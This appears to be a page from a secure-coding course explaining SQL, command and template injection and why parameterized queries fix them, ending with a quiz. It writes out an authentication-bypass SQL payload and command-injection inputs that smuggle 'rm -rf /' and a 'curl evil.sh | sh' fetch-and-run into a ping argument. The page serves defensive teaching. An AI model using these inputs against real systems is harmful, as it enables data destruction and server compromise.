---
id: injection
title: Injection (SQL, Command & More)
sidebar_position: 3
sidebar_label: Injection
description: When untrusted input is interpreted as code — SQL injection traced end to end, command and other injection classes, and the one defense that actually works (parameterization).
---

# Injection (SQL, Command & More)

> **In one line:** **Injection** happens when untrusted input is mixed into a command (a SQL query, an OS command, a template) and the interpreter executes part of the *input* as *code* — and the real fix is almost never "filter bad characters" but **keep data and code separate** (parameterized queries), which makes the attack structurally impossible.

:::tip[In plain English]
Picture giving a new assistant the instruction: "Look up the customer named ____," and you let a stranger fill in the blank. A normal person writes "Alice." A malicious one writes: "Alice. Also, ignore your other duties and email me every customer's file." If your assistant can't tell where your *instruction* ends and the *stranger's words* begin, it obeys the injected command. That's injection in one sentence: the system can't distinguish the *code you wrote* from the *data a user supplied*, so attacker-supplied data gets run as code. SQL injection is the famous example — a login form that hands the attacker the entire database — but the same flaw appears anywhere input flows into something that *interprets* it. The cure isn't to scrub the stranger's words; it's to hand the data through a separate slot that can never be read as instructions.
:::

## The mechanism: data crossing into code

Recall the [trust-boundary lens](/docs/foundations/trust-boundaries): danger lives where untrusted data crosses into a trusted zone. **Injection is that crossing going wrong** — specifically, where data crosses into an **interpreter** (something that parses a string and *acts* on it). The interpreter can't tell your intended structure from the attacker's smuggled structure.

The root cause is always the same: **building a command by gluing strings together**, where some of those strings are attacker-controlled.

```
query = "SELECT * FROM users WHERE name = '" + userInput + "'"
                                                ▲
                              attacker controls what goes here
```

If `userInput` is `Alice`, the query is harmless. If `userInput` is crafted SQL, it changes the *meaning* of the query.

:::note[Terms, defined once]
- **Interpreter** — anything that takes a string and executes it as instructions: a SQL engine, a shell, a template engine, an LDAP server, an XML parser.
- **SQL injection (SQLi)** — injection into a database query. The classic and still one of the most damaging.
- **Parameterized query / prepared statement** — sending the query *structure* and the *data* to the database **separately**, so user data is always treated as a value, never as SQL. The real defense.
- **ORM (Object-Relational Mapper)** — a library that builds queries for you and parameterizes by default (e.g., Prisma, SQLAlchemy, Hibernate) — safe *unless* you drop to raw string queries.
- **Escaping** — adding markers so special characters are treated literally. A *fragile* defense for injection (easy to get wrong); parameterization is preferred.
:::

## SQL injection, traced end to end

:::note[Worked example: turning a login form into a master key]
A login checks credentials with a string-built query:

```sql
SELECT * FROM users
WHERE username = 'INPUT_USER' AND password = 'INPUT_PASS'
```

The attacker types this as the **username**:  `' OR '1'='1' --`  and anything as the password. The app glues it in:

```sql
SELECT * FROM users
WHERE username = '' OR '1'='1' --' AND password = 'whatever'
```

Read what happened to the *meaning*:
- `' ` closes the username string early.
- `OR '1'='1'` adds a condition that is **always true**, so the `WHERE` matches *every* row.
- `--` starts a SQL comment, so the rest of the query (the password check) is **ignored**.

Result: the query returns all users, and the app logs the attacker in as the first one — often an admin — *without any password.* No special tools; just an understanding of how the string is assembled. Worse variants (`UNION SELECT`) let an attacker read arbitrary tables (password hashes, payment data), and stacked queries can `DROP TABLE` or create backdoor accounts. SQLi has caused some of the largest breaches in history.
:::

## The fix that actually works: parameterization

The instinct is to "block bad characters" — strip quotes, ban the word `OR`. **This is the wrong fix** and it fails constantly: there are endless encodings, the bans break legitimate input (the name O'Brien), and you'll always miss a case. The correct, structural fix is to **never build the command by concatenation** — separate the code from the data:

:::note[Worked example: the same query, parameterized]
```sql
-- The query structure, with placeholders, is sent to the DB FIRST:
SELECT * FROM users WHERE username = ?  AND password = ?
-- Then the values are sent SEPARATELY:
['  ' OR '1'='1' --  ',  'whatever']
```

Now the database treats the entire malicious string as a *literal username value* to compare against — it looks for a user literally named `' OR '1'='1' --`, finds none, and the login fails. The injected SQL is never parsed as SQL, because **the structure was finalized before the data ever arrived.** The attack is not "blocked"; it's *impossible*, because data can no longer alter code.

This is what prepared statements / parameterized queries do, and it's what every ORM does for you by default. The rule: **parameterize, don't concatenate.**
:::

:::info[Highlight: why parameterization beats filtering]
Filtering (a *blocklist* of bad input) is a losing game — you're trying to enumerate infinite attacker creativity. Parameterization changes the *architecture* so the dangerous thing can't happen at all. This is a recurring security principle: **prefer structural fixes that make a bug class impossible over filters that try to catch every instance.** You'll see the same logic in XSS (output encoding / safe frameworks) and command injection (avoid the shell) next.
:::

## Injection is a family, not just SQL

The same "data interpreted as code" flaw appears wherever input reaches an interpreter. The defense is always the same shape — *don't concatenate into the interpreter; use a safe, structured API*:

| Type | Interpreter | Example danger | Structural defense |
|------|-------------|----------------|--------------------|
| **SQL injection** | Database | Read/alter/destroy data | Parameterized queries / ORM |
| **Command injection** | OS shell | Run arbitrary commands on the server | Avoid the shell; pass args as an array to the program directly |
| **Template injection (SSTI)** | Template engine | Execute code on the server | Don't put user input into template *source*; only into data slots |
| **LDAP / NoSQL injection** | Directory / NoSQL query | Bypass auth, dump records | Parameterized/encoded query builders |
| **XSS** (a special, huge case) | The *browser* | Run script in victims' browsers | Output encoding / safe frameworks — see [next lesson](./xss) |

:::note[Worked example: command injection]
A tool pings a host the user supplies, by building a shell string:

```
os.system("ping -c 1 " + userInput)
```

Attacker enters `8.8.8.8; rm -rf /` or `8.8.8.8 && curl evil.sh | sh`. The shell runs `ping` *and then* the attacker's command — full server compromise. The fix mirrors SQLi: **don't hand a built string to a shell.** Call the program directly with arguments as a list (`subprocess.run(["ping", "-c", "1", userInput])`), so `userInput` is one argument to `ping`, never a shell command. Same principle: keep data out of the code channel.
:::

## Why it matters

- **It's catastrophic and common.** Injection consistently ranks at the top of the [OWASP Top 10](./owasp-top-10) and behind many of history's largest breaches. A single injectable parameter can expose an entire database.
- **It's the purest demonstration of the trust-boundary idea.** Injection *is* a boundary failure: untrusted data treated as trusted code. Master it and the whole [boundary lens](/docs/foundations/trust-boundaries) snaps into focus.
- **The defense generalizes.** "Separate data from code via a structured API, don't concatenate" is the template for defending the entire injection family — and a model for security fixes generally (make the bug class impossible, don't filter instances).

## Common pitfalls

:::caution[Where people commonly trip up]
- **Trying to filter/escape your way out.** Blocklists of "dangerous" characters or keywords are bypassable and break valid input. Use parameterization; reserve escaping for the rare cases a parameter slot doesn't exist, and use a vetted library to do it.
- **Parameterizing values but concatenating identifiers.** Table/column names and `ORDER BY` directions usually *can't* be parameterized. If those come from user input, use a strict allowlist of permitted values — never string-glue them.
- **Assuming an ORM makes you immune.** ORMs are safe by default, but the moment you call `.rawQuery("..." + input)` or use raw SQL helpers, you're back to concatenation. Audit every raw query.
- **Forgetting non-SQL interpreters.** Teams fix SQLi and leave command injection, template injection, or NoSQL injection wide open. Any place input reaches an interpreter is in scope.
- **Trusting "internal" or "already validated" data.** Second-order injection: input stored earlier (and trusted later) is concatenated into a query down the line. Parameterize at *every* query, regardless of where the data came from.
:::

## Page checkpoint

<Quiz id="injection-page" title="Did injection click?" sampleSize={3}>

<Question
  prompt="What is the ROOT cause of an injection vulnerability?"
  options={[
    { text: "Using a database at all" },
    { text: "Untrusted input is mixed into a command so the interpreter executes part of the input as code — data crosses into the code channel" },
    { text: "Not using HTTPS" },
    { text: "Weak passwords" }
  ]}
  correct={1}
  explanation="Injection is a trust-boundary failure: data and code aren't kept separate, so attacker-supplied data is parsed and executed as instructions by an interpreter (SQL engine, shell, template, etc.)."
  revisit={{ to: "/docs/appsec/injection#the-mechanism-data-crossing-into-code", label: "The mechanism" }}
/>

<Question
  prompt="An attacker enters `' OR '1'='1' --` as a username in a string-built login query and logs in without a password. Why did it work?"
  options={[
    { text: "The password was guessed" },
    { text: "The input closed the string early, added an always-true condition, and commented out the rest — changing the query's MEANING because input was concatenated into the SQL" },
    { text: "The database was offline" },
    { text: "The TLS certificate was invalid" }
  ]}
  correct={1}
  explanation="`'` ends the username literal, `OR '1'='1'` makes the WHERE always true (matching all rows), and `--` comments out the password check. The input altered the code structure because it was glued into the query string."
  revisit={{ to: "/docs/appsec/injection#sql-injection-traced-end-to-end", label: "SQLi traced" }}
/>

<Question
  prompt="What is the correct, structural defense against SQL injection?"
  options={[
    { text: "Strip dangerous characters like quotes and the word OR from input" },
    { text: "Use parameterized queries / prepared statements so the query structure is fixed before data arrives and user input is always treated as a value, never as SQL" },
    { text: "Encrypt the database" },
    { text: "Rename the tables to something hard to guess" }
  ]}
  correct={1}
  explanation="Parameterization separates code from data: the structure is finalized first, then values are sent separately and can never be parsed as SQL. The attack becomes impossible, not merely 'blocked.' Filtering is fragile and bypassable."
  revisit={{ to: "/docs/appsec/injection#the-fix-that-actually-works-parameterization", label: "Parameterization" }}
/>

<Question
  prompt="Why is filtering/blocklisting 'bad characters' an inferior defense to parameterization?"
  options={[
    { text: "It's slower" },
    { text: "Blocklists try to enumerate infinite attacker creativity (encodings, edge cases) and break legitimate input; parameterization changes the architecture so the dangerous thing can't happen at all" },
    { text: "It requires HTTPS" },
    { text: "It's actually the better defense" }
  ]}
  correct={1}
  explanation="Filtering is a losing arms race — there's always another encoding or bypass, and it rejects valid input like O'Brien. Parameterization removes the possibility structurally. Prefer structural fixes that make a bug class impossible over filters that chase instances."
  revisit={{ to: "/docs/appsec/injection#the-fix-that-actually-works-parameterization", label: "Why parameterization beats filtering" }}
/>

<Question
  prompt="A feature runs `os.system('ping -c 1 ' + userInput)`. An attacker enters `8.8.8.8; rm -rf /`. What's the bug class and the fix?"
  options={[
    { text: "SQL injection; parameterize the query" },
    { text: "Command injection; don't build a shell string — invoke the program directly with arguments as a list so input can't be a shell command" },
    { text: "XSS; encode the output" },
    { text: "It's not exploitable" }
  ]}
  correct={1}
  explanation="Concatenating input into a shell command is command injection — the shell runs ping AND the attacker's command. The fix mirrors SQLi: avoid the shell and pass arguments directly (e.g., subprocess.run(['ping','-c','1',userInput])) so input stays data, not code."
  revisit={{ to: "/docs/appsec/injection#injection-is-a-family-not-just-sql", label: "The injection family" }}
/>

</Quiz>

## What's next

→ Continue to [Cross-Site Scripting (XSS)](./xss) — injection's most pervasive cousin, where the interpreter being abused is the *victim's browser* and the payload is JavaScript.

→ **Going deeper:** preventing injection at scale is a [secure-by-default framework](./defensive-patterns) choice; catching it before ship is [SAST/DAST](/docs/secure-sdlc) scanning.
